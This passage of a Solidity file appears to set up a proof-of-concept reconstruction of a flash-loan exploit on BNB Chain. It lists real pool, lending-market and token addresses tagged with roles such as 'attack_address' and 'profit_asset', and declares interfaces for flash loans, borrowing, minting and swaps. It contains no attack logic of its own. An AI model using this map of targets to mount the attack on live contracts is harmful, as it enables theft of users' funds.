    address internal constant PancakeV3Pool_EDE5 = 0x5bd808Ab85C124f99080da5F864EDcB39950edE5; // Addresses.PancakeV3Pool_EDE5 = 0x5bd808ab85c124f99080da5f864edcb39950ede5 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_6807DC =
        0x6807dc923806fE8Fd134338EABCA509979a7e0cB; // Addresses.InitializableImmutableAdminUpgradeabilityProxy_6807DC = 0x6807dc923806fe8fd134338eabca509979a7e0cb label=InitializableImmutableAdminUpgradeabilityProxy roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant vWBNB = 0x6bCa74586218dB34cdB402295796b79663d816e9; // Addresses.vWBNB = 0x6bca74586218db34cdb402295796b79663d816e9 label=VBep20Delegator token_symbol=vWBNB roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_604A = 0x788fC153ba6AC3a92BA98868a1dDe1652b4f604A; // Addresses.PancakeV3Pool_604A = 0x788fc153ba6ac3a92ba98868a1dde1652b4f604a label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant UniswapV3Pool_E507 = 0x81C7294b66955824BC04acB642ae8dC58e6cE507; // Addresses.UniswapV3Pool_E507 = 0x81c7294b66955824bc04acb642ae8dc58e6ce507 label=UniswapV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant CRC = 0x8581433150F2c48fF2eFE5A22B17C7d405054509; // Addresses.CRC = 0x8581433150f2c48ff2efe5a22b17c7d405054509 label=CrowdRingCircle token_symbol=众环CRC roles=asset|contract|attack_address|recipient|sender|token_related source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_99DE = 0x8F6ef959FA19173Bd4668B83E80F82442B2c99DE; // Addresses.PancakeV3Pool_99DE = 0x8f6ef959fa19173bd4668b83e80f82442b2c99de label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC1967Proxy = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C; // Addresses.ERC1967Proxy = 0x8f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c label=ERC1967Proxy roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_3121 = 0x92b7807bF19b7DDdf89b706143896d05228f3121; // Addresses.PancakeV3Pool_3121 = 0x92b7807bf19b7dddf89b706143896d05228f3121 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_5672 = 0x97620e003c03381EaCBDE7135F28d94303bb5672; // Addresses.PancakeV3Pool_5672 = 0x97620e003c03381eacbde7135f28d94303bb5672 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant aBnbWBNB = 0x9B00a09492a626678E5A3009982191586C444Df9; // Addresses.aBnbWBNB = 0x9b00a09492a626678e5a3009982191586c444df9 label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=aBnbWBNB roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_2CCE = 0x9c4Ee895e4f6Ce07Ada631C508D1306Db7502cCE; // Addresses.PancakeV3Pool_2CCE = 0x9c4ee895e4f6ce07ada631c508d1306db7502cce label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_DA61 = 0x9F599F3D64a9D99eA21e68127Bb6CE99f893DA61; // Addresses.PancakeV3Pool_DA61 = 0x9f599f3d64a9d99ea21e68127bb6ce99f893da61 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_7650 = 0x9F8f4615Ff5143aeE365fa34f34196fB85Be7650; // Addresses.PancakeV3Pool_7650 = 0x9f8f4615ff5143aee365fa34f34196fb85be7650 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_94E4 = 0xA0909f81785f87f3e79309F0E73A7d82208094E4; // Addresses.PancakeV3Pool_94E4 = 0xa0909f81785f87f3e79309f0e73a7d82208094e4 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_AD17 = 0xA5DbEaf16Fc031eae92175974F8d0A439bE4aD17; // Addresses.PancakeV3Pool_AD17 = 0xa5dbeaf16fc031eae92175974f8d0a439be4ad17 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant aBnbUSDT = 0xa9251ca9DE909CB71783723713B21E4233fbf1B1; // Addresses.aBnbUSDT = 0xa9251ca9de909cb71783723713b21e4233fbf1b1 label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=aBnbUSDT roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_C1AF = 0xB4Db9FCdA97fd7B02eAf1e8317E6DdB04BaCC1AF; // Addresses.PancakeV3Pool_C1AF = 0xb4db9fcda97fd7b02eaf1e8317e6ddb04bacc1af label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_EB0F = 0xB67e5EaF770a384Ab28029d08B9bC5EBE32beb0F; // Addresses.PancakeV3Pool_EB0F = 0xb67e5eaf770a384ab28029d08b9bc5ebe32beb0f label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // Addresses.WBNB = 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c label=WBNB token_symbol=WBNB roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_7A4A = 0xBee2C57e3a11220e2B948E26965DAAA9dFD87A4A; // Addresses.PancakeV3Pool_7A4A = 0xbee2c57e3a11220e2b948e26965daaa9dfd87a4a label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant attack_path_entry = 0xc5940D118f9C2070478545bA80a780Aa8F86d133; // Addresses.attack_path_entry = 0xc5940d118f9c2070478545ba80a780aa8f86d133 label=attack_path_entry roles=asset|attack_path_entry_contract|attacker_contract|code_contract|contract|attack_address|poc_reconstruction_surface|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant PancakeV3Pool_CEA5 = 0xCA3F029A70d5d90000E614afD29E5c833f33CEa5; // Addresses.PancakeV3Pool_CEA5 = 0xca3f029a70d5d90000e614afd29e5c833f33cea5 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_7057 = 0xcF59B8C8BAA2dea520e3D549F97d4e49aDE17057; // Addresses.PancakeV3Pool_7057 = 0xcf59b8c8baa2dea520e3d549f97d4e49ade17057 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_D759 = 0xd21bc2291C1aeF340f5265E257B18aa5dafed759; // Addresses.PancakeV3Pool_D759 = 0xd21bc2291c1aef340f5265e257b18aa5dafed759 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant Cake_LP = 0xd8799A644850c065388c22DF4eE0C28472922526; // Addresses.Cake_LP = 0xd8799a644850c065388c22df4ee0c28472922526 label=PancakePair token_symbol=Cake-LP roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant UniswapV3Pool_8032 = 0xDc85C2BB53D927006B2dB488a0CB4605fcA48032; // Addresses.UniswapV3Pool_8032 = 0xdc85c2bb53d927006b2db488a0cb4605fca48032 label=UniswapV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant UniswapV3Pool_CA9C = 0xE1aCb466421eD24Dd8bd381D1205baD0ad43Ca9c; // Addresses.UniswapV3Pool_CA9C = 0xe1acb466421ed24dd8bd381d1205bad0ad43ca9c label=UniswapV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_5C9A = 0xeAA6C7292eD954CA9Dd72E769568D057B0525c9A; // Addresses.PancakeV3Pool_5C9A = 0xeaa6c7292ed954ca9dd72e769568d057b0525c9a label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_9E6B = 0xef7D88D12b6393fE06f5F07d48d7B76511909e6b; // Addresses.PancakeV3Pool_9E6B = 0xef7d88d12b6393fe06f5f07d48d7b76511909e6b label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_82D8 = 0xf4262C4dbF524f53851A5176bdC7D6C1e0fA82D8; // Addresses.PancakeV3Pool_82D8 = 0xf4262c4dbf524f53851a5176bdc7d6c1e0fa82d8 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_0AA9 = 0xF80Ab3Cc041d8Ccc1c51AcC295AFdba26AD70Aa9; // Addresses.PancakeV3Pool_0AA9 = 0xf80ab3cc041d8ccc1c51acc295afdba26ad70aa9 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_4577 = 0xFa09940612D7Ae39F7F220f3Ca6816bd72844577; // Addresses.PancakeV3Pool_4577 = 0xfa09940612d7ae39f7f220f3ca6816bd72844577 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant Unitroller = 0xfD36E2c2a6789Db23113685031d7F16329158384; // Addresses.Unitroller = 0xfd36e2c2a6789db23113685031d7f16329158384 label=Unitroller roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant vUSDT = 0xfD5840Cd36d94D7229439859C0112a4185BC0255; // Addresses.vUSDT = 0xfd5840cd36d94d7229439859c0112a4185bc0255 label=VBep20Delegator token_symbol=vUSDT roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
}

interface IERC1967Proxy {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface IInitializableImmutableAdminUpgradeabilityProxy_6807DC {
    function borrow(address, uint256, uint256, uint16, address) external;
    function repay(address, uint256, uint256, address) external returns (uint256);
    function supply(address, uint256, address, uint16) external;
    function withdraw(address, uint256, address) external returns (uint256);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
    function swapTokensForExactTokens(uint256, uint256, address[] calldata, address, uint256)
        external
        returns (uint256[] memory);
}

interface IPancakeV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_0AA9 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_107C {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_2CCE {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_3121 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_3196 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_4577 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_5672 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_5C9A {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_604A {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_7057 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_7650 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_7A4A {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_82D8 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_94E4 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_9818 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_99DE {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_9E6B {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_AD17 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_C1AF {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_CEA5 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_D759 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_DA61 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_EB0F {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_EDE5 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_F849 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IUniswapV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IUniswapV3Pool_8032 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IUniswapV3Pool_CA9C {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IUniswapV3Pool_E507 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IUnitroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
}

interface IVault_238A35 {
    function lock(bytes calldata) external returns (uint256[] memory);
    function settle() external returns (uint256);
    function sync(address) external;
    function take(address, address, uint256) external;
    function sync() external;
}

interface IvUSDT {
    function borrow(uint256) external returns (uint256);
    function repayBorrow(uint256) external returns (uint256);
}

interface IvWBNB {
    function mint(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}

library Harness {
    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
